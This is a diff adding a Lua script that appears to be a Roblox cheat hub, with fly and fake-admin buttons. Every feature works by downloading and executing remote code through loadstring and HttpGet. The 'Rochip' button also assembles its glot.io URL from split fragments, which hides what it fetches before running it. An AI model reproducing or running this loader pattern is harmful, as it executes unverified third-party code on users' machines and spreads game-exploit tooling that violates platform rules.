@@ -1,0 +1,46 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Kingdestony Universe hub", HidePremium = false, SaveConfig = true, ConfigFolder = "1"})
+OrionLib:MakeNotification({
+    Name = "Subscribe Kingdestony",
+    Content = "Nah id win",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+    
+})
+local Tab = Window:MakeTab({
+    Name = "Fly",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+local Section = Tab:AddSection({
+    Name = "Smth idk"
+})
+Tab:AddButton({
+    Name = "Fly",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+              print("sub Kingdestony")
+      end
+})
+local Tab2 = Window:MakeTab({
+    Name = "Admin fake",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+local Section = Tab2:AddSection({
+    Name = "Admin command"
+})
+
+Tab2:AddButton({
+    Name = "Rochip",
+    Callback = function()
+    if "Rochips Loader" then
+    local Rochips_panel,v,u,i=loadstring,"/snippets","gwwv","/raw/main.lua" ;
+    Rochips_panel(game:HttpGet("https://glot.io"..v.."/" ..u.."877ga3"..i))();
+    return "it will load in around 3 - 131 seconds"
+end
+              print("Sub Kingdestony")
+      end    
+})
+
+OrionLib:Init()
